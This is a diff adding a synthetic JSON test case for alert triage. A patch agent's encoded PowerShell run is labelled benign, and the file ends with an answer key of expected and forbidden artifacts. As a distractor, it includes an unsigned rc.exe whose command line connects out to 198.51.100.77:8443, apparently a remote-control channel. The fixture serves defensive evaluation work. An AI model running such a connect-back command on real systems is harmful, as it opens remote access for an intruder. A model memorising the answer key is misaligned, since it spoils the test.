@@ -1,0 +1,154 @@
+{
+  "name": "synthetic_benign_independent_noise",
+  "note": "SYNTHETIC. Legitimate alert; an unrelated intrusion on the same host must not be pulled in.",
+  "alert_text": {
+    "title": "PowerShell ran an encoded command under a service account",
+    "severity": "medium",
+    "host": "SRV-APP-07",
+    "description": "powershell.exe with -EncodedCommand started by the patch agent.",
+    "trigger_entities": [
+      "proc:ps-2204",
+      "host:SRV-APP-07"
+    ]
+  },
+  "entities": {
+    "host:SRV-APP-07": {
+      "type": "host",
+      "hostname": "SRV-APP-07",
+      "role": "application server"
+    },
+    "proc:ps-2204": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell.exe -NoProfile -EncodedCommand R2V0LUhvdEZpeA==",
+      "parent_image": "C:\\Program Files\\PatchPilot\\ppagent.exe",
+      "user": "CORP\\svc_patch",
+      "logon_id": "0x2201",
+      "start_time": "2026-03-02T02:10:00Z",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:ppagent-800": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files\\PatchPilot\\ppagent.exe",
+      "user": "CORP\\svc_patch",
+      "signed": true,
+      "signer": "PatchPilot Inc",
+      "logon_id": "0x2201"
+    },
+    "task:patch-scan": {
+      "type": "scheduled_task",
+      "name": "PatchPilot Nightly Scan",
+      "action": "ppagent.exe --scan --report",
+      "trigger": "daily 02:10",
+      "run_as": "CORP\\svc_patch"
+    },
+    "file:hotfix-report": {
+      "type": "windows_file",
+      "path": "C:\\ProgramData\\PatchPilot\\reports\\hotfix_0302.json"
+    },
+    "user:svc_patch": {
+      "type": "windows_user",
+      "username": "svc_patch",
+      "domain": "CORP",
+      "account_type": "service",
+      "group_memberships": [
+        "Patch Operators"
+      ]
+    },
+    "user:helpdesk7": {
+      "type": "windows_user",
+      "username": "helpdesk7",
+      "domain": "CORP",
+      "account_type": "user"
+    },
+    "proc:rc-7781": {
+      "type": "windows_process",
+      "image_path": "C:\\Temp\\rc.exe",
+      "cmdline": "rc.exe -connect 198.51.100.77:8443",
+      "user": "CORP\\helpdesk7",
+      "logon_id": "0x9C4E",
+      "start_time": "2026-03-01T19:42:00Z",
+      "signed": false
+    },
+    "net:rc-c2": {
+      "type": "network_connection",
+      "dst_ip": "198.51.100.77",
+      "dst_port": 8443
+    }
+  },
+  "relations": {
+    "rel:ppagent-ps": {
+      "type": "win_process_create",
+      "source": "proc:ppagent-800",
+      "target": "proc:ps-2204"
+    },
+    "rel:task-ppagent": {
+      "type": "ran_scheduled_task",
+      "source": "task:patch-scan",
+      "target": "proc:ppagent-800"
+    },
+    "rel:ps-report": {
+      "type": "wrote_file",
+      "source": "proc:ps-2204",
+      "target": "file:hotfix-report"
+    },
+    "rel:patch-runs": {
+      "type": "runs_process",
+      "source": "user:svc_patch",
+      "target": "proc:ps-2204"
+    },
+    "rel:helpdesk-runs": {
+      "type": "runs_process",
+      "source": "user:helpdesk7",
+      "target": "proc:rc-7781"
+    },
+    "rel:rc-conn": {
+      "type": "connected_to",
+      "source": "proc:rc-7781",
+      "target": "net:rc-c2"
+    }
+  },
+  "expected": {
+    "verdict": "benign",
+    "artifacts": [
+      {
+        "entity_id": "proc:ps-2204",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "proc:ppagent-800",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "task:patch-scan",
+        "kind": "artifact_observed"
+      }
+    ],
+    "critical": [
+      {
+        "entity_id": "proc:ppagent-800",
+        "fields_any": [
+          "image_path",
+          "signer"
+        ]
+      },
+      {
+        "entity_id": "task:patch-scan",
+        "fields_any": [
+          "action",
+          "trigger",
+          "run_as"
+        ]
+      }
+    ],
+    "must_see": [
+      "proc:ppagent-800"
+    ],
+    "forbidden_artifacts": [
+      "proc:rc-7781",
+      "net:rc-c2",
+      "user:helpdesk7"
+    ]
+  }
+}
